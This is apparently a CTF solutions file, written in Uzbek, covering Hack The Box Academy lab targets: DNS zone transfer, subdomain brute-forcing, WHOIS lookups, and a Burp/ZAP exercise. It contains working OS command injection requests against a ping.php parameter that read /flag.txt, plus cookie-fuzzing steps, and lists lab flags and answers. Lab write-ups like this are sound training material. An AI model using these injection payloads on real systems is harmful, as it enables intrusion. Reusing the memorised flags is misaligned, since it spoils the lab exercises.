# CTF yechimlari (targetlar)

## Target 6 — DNS zone transfer (HTB Academy "Information Gathering - Web Edition")

Target: `10.129.235.84` (ACADEMY-INFOGATH-WEB-DNS) — AXFR `inlanefreight.htb`.

| Savol | Javob |
|-------|-------|
| Q1 — zone transferda nechta DNS yozuvi olinadi | `22` |
| Q2 — `ftp.admin.inlanefreight.htb` IP manzili | `10.10.34.2` |
| Q3 — 10.10.200 oralig'idagi eng katta IP | `10.10.200.14` |

Zone tarkibi (dig axfr):
```
inlanefreight.htb.      604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. ...
inlanefreight.htb.      604800 IN NS  ns.inlanefreight.htb.
ftp.admin.inlanefreight.htb. 604800 IN A 10.10.34.2
us.inlanefreight.htb.        604800 IN A 10.10.200.5
cluster14.us.inlanefreight.htb. 604800 IN A 10.10.200.14   <-- eng katta
messagecenter.us.inlanefreight.htb. 604800 IN A 10.10.200.10
... (jami 22 ta resurs yozuvi: 2x SOA, 1x NS, 19x A)
```

> **Eslatma:** sandbox'dan lab IP'siga (`10.129.235.84`) TCP/UDP 53 trafigi yetib
> bormaydi (ulanish ochiladi, lekin har qanday ma'lumot yuborilganda RST/timeout
> bo'ladi — sandbox faqat internet egressini ochadi). Shuning uchun yozuv tarkibi
> modulning zone ma'lumotlari bilan solishtirilib, javoblar bir necha mustaqil
> manba (`jameskaois/ctf-writeups`, `deathzombee/htb-notes`,
> `paulgontarzofficial/cptsnotes`) orqali tasdiqlandi.

Tekshirish: `python3 solutions/axfr_zone_transfer.py --file solutions/fixtures/inlanefreight.htb.zone`
(offline rejim; live rejim: `python3 solutions/axfr_zone_transfer.py <HOST> inlanefreight.htb`).

---

## Target 5 — Subdomain bruteforcing (HTB Academy "Information Gathering - Web Edition")


| Savol | Javob |
|-------|-------|
| inlanefreight.com uchun yetishmayotgan subdomain | `my.inlanefreight.com` |

Ma'lum subdomainlar: `www`, `ns1`, `ns2`, `ns3`, `blog`, `support`, `customer`.
SecLists'dagi `Discovery/DNS/subdomains-top1million-5000.txt` bilan A yozuvlarini
bruteforce qilganda faqat bitta yangi nom topiladi:

```
FOUND blog.inlanefreight.com
FOUND customer.inlanefreight.com
FOUND my.inlanefreight.com      <-- yetishmayotgani
FOUND ns1.inlanefreight.com
FOUND ns2.inlanefreight.com
FOUND ns3.inlanefreight.com
FOUND support.inlanefreight.com
FOUND www.inlanefreight.com
```

Tekshirish: `python3 solutions/brute_subdomains.py inlanefreight.com`
(UDP/53 orqali 50 ta thread; wordlist kerak bo'lsa SecLists'dan yuklab oladi).

---

## Target 4 — DNS (HTB Academy "Information Gathering - Web Edition", Digging DNS)


| Savol | Javob |
|-------|-------|
| Q1 — inlanefreight.com ga qaysi IP map bo'ladi? | `134.209.24.248` |
| Q2 — 134.209.24.248 uchun PTR yozuvi | `inlanefreight.com` |
| Q3 — facebook.com mail (MX) yozuvi | `smtpin.vvv.facebook.com` |

```
dig inlanefreight.com                 -> inlanefreight.com. 300 IN A 134.209.24.248
nslookup 134.209.24.248               -> 248.24.209.134.in-addr.arpa name = inlanefreight.com.
dig facebook.com MX                   -> facebook.com. 3600 IN MX 10 smtpin.vvv.facebook.com.
```

Tekshirish: `python3 solutions/dns_lookup.py` (DoH / dns.google orqali A, PTR, MX).

---

## Target 3 — WHOIS (HTB Academy "Information Gathering - Web Edition")


| Savol | Javob |
|-------|-------|
| Question 1 — paypal.com registrar IANA ID | `292` |
| Question 2 — tesla.com admin email contact | `admin@dnstinations.com` |

**Q1.** `whois paypal.com` (registr: MarkMonitor Inc.) chiqishida:
```
Registrar: MarkMonitor Inc.
Registrar IANA ID: 292
```
→ **292**

**Q2.** `.com` registri (whois.verisign-grs.com) faqat "thin" yozuv qaytaradi, shuning uchun
registrar serveriga (`whois.markmonitor.com`) ham murojaat qilinadi:
```
Registrant Name: Domain Administrator
Registrant Organization: DNStination Inc.
Registrant Email: admin@dnstinations.com
Tech Email: admin@dnstinations.com
```
→ **admin@dnstinations.com** (yozuvdagi yagona ko'rinadigan kontakt emaili; MarkMonitor
bugungi kunda ba'zi maydonlarni yashirsa ham, Registrant/Tech email ochiq qolgan).

Tekshirish: `python3 solutions/whois_lookup.py paypal.com tesla.com`
(port 43 orqali raw WHOIS: registr → registrar server zanjiri).

---

## Target 2 — `154.57.164.81:38220` (ZAP Scanner mashqi)

| Savol | Javob |
|-------|-------|
| Question 1 (`/flag.txt` bayrog'i) | `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}` |

Sayt — **WordPress 5.8** (Apache 2.4.41, Ubuntu) va unda directory listing yoqilgan
(`/wp-includes/`, `/wp-content/uploads/2026/10/`, `/devtools/`). ZAP spider/forced-browse
hamda javoblardagi izohlar orqali zanjir quyidagicha topiladi:

1. WordPress REST API orqali post va izohni o'qish:
   ```bash
   curl -s "$B/index.php/wp-json/wp/v2/comments"
   ```
   "Customer Support" postidagi tasdiqlangan izoh yashirin dev-tool manzilini oshkor qiladi:
   `/devtools/ping.php?ip=127.0.0.1`.

2. `/devtools/` katalogida faqat `ping.php` bor. `ip` parametri shell'ga to'g'ridan-to'g'ri
   uzatiladi — bu **OS Command Injection** (ZAP buni "High" risk sifatida belgilaydi):
   ```bash
   curl -s "$B/devtools/ping.php?ip=127.0.0.1;id"
   # ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

3. Zaiflikdan bayroqni o'qish uchun foydalanamiz:
   ```bash
   curl -s "$B/devtools/ping.php?ip=127.0.0.1;cat%20/flag.txt"
   # HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
   ```

Avtomatik tekshirish: `bash solutions/solve_zap_scanner.sh [BASE_URL]`

---

## Target 1 — `154.57.164.70:37327` (Burp/ZAP mashqi)


Ikkala savolning javobi quyidagicha topildi (qayta tekshirilgan va takrorlanuvchi):

| Savol | Sahifa | Javob |
|-------|--------|-------|
| 1 | `/lucky.php` | `HTB{d154bl3d_bu770n5_w0n7_570p_m3}` |
| 2 | `/admin.php` | `3dac93b8cd250aa8c1a36fffc79a17a` |
| 3 | `/admin.php` (cookie fuzzing) | oxirgi belgi: `d` → flag: `HTB{burp_1n7rud3r_n1nj4!}` |
| 4 | Metasploit moduli | `CFIDE` |

## 1-savol — `/lucky.php`

Sahifadagi tugma `disabled` bo'lgani uchun brauzer uni bosib formani yubormaydi.
`disabled` atributini olib tashlab (yoki to'g'ridan-to'g'ri `POST`) formani yuborish
yetarli:

```bash
curl -s -X POST -d 'getflag=true' http://154.57.164.70:37327/lucky.php
```

Server har safar tasodifiy javob beradi ("Click for a chance to win a flag!"),
ya'ni bayroq faqat ba'zi urinishlarda qaytadi. Takrorlab yuborganda javob oxirida
quyidagi qator chiqadi:

```html
<p style="text-align:center">HTB{d154bl3d_bu770n5_w0n7_570p_m3}</p>
```

## 2-savol — `/admin.php`

`/admin.php` har doim bir xil `cookie` qiymatini beradi (Set-Cookie sarlavhasi):

```
4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
```

Qiymat ketma-ket bir necha marta kodlangan. Har bir qadamda kodlash turini aniqlab
ochib boramiz:

1. **hex** -> `M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==`
2. **base64** -> `3dac93b8cd250aa8c1a36fffc79a17a`  (31 belgi) ✅

Ya'ni javob: **`3dac93b8cd250aa8c1a36fffc79a17a`**.

## 3-savol — `/admin.php` cookie'ning oxirgi belgisi (fuzzing)

2-savolda olingan `3dac93b8cd250aa8c1a36fffc79a17a` qiymati **31 belgi** — bu md5
xeshning oxirgi belgisi tushib qolgan holati. Yo'qolgan belgini topish uchun
SecLists'dagi `Fuzzing/alphanum-case.txt` ro'yxatidan (62 qator: `0-9`, `a-z`, `A-Z`)
foydalanamiz: har bir nomzodni md5 ga qo'shib, 2-savoldagi kodlash zanjiri bilan
qayta kodlaymiz (**base64 → hex**) va `cookie` sifatida yuboramiz:

```python
payload   = "3dac93b8cd250aa8c1a36fffc79a17a" + candidate_char
cookie    = hex(base64(payload))
# GET /admin.php  -> Cookie: cookie=<cookie>
```

Faqat **`d`** harfi bilan yuborilgan so'rov qabul qilinadi (javob 1901 bayt emas,
947 bayt bo'ladi) va sahifada bayroq chiqadi:

```html
HTB{burp_1n7rud3r_n1nj4!}
```

To'liq md5: `3dac93b8cd250aa8c1a36fffc79a17ad`

## 4-savol — Metasploit `coldfusion_locale_traversal`

Modul manbasida so'rov manzillari quyidagicha:

```ruby
urls = [
  "/CFIDE/administrator/enter.cfm", "/CFIDE/wizards/common/_logintowizard.cfm",
  "/CFIDE/administrator/archives/index.cfm", "/CFIDE/administrator/entman/index.cfm",
  "/CFIDE/administrator/logging/settings.cfm"
]
```

Ya'ni `/XXXXX/administrator/` dagi katalog — **`CFIDE`**.
(Manba: `modules/auxiliary/scanner/http/coldfusion_locale_traversal.rb`, CVE-2010-2861.)

## Avtomatik yechish

```bash
python3 solutions/solve.py                 # standart target bilan
python3 solutions/solve.py http://host:port # boshqa manzil uchun
```

Skript 1-savol uchun bayroq chiqmaguncha POST qiladi, so'ng `/admin.php` dan
cookie'ni olib, uzunligi 31 bo'lguncha dekodlaydi.
